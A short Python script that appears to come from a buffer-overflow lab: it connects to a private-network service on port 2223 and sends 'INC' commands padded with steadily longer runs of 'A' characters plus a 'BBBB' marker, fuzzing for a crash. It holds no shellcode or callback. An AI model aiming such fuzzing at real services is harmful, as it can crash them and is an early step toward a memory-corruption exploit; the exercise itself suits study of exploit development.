import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#info of host
host = "192.168.195.237" #remember to change again before running
port = 2223

sock.connect((host, port))

#receive initial welcome message
response = sock.recv(2048)
print(response)

#try giving input of increasing lengths
length = 0
while (length < 1500):
    payload = b"INC " + b"A"*length + b"BBBB" + b"C"*10

    print("Sending Payload of size " + str(length))
    sock.send(payload)

    response = sock.recv(2048)
    #response = sock.recv(2048)
    print(response.decode())
    length+=1
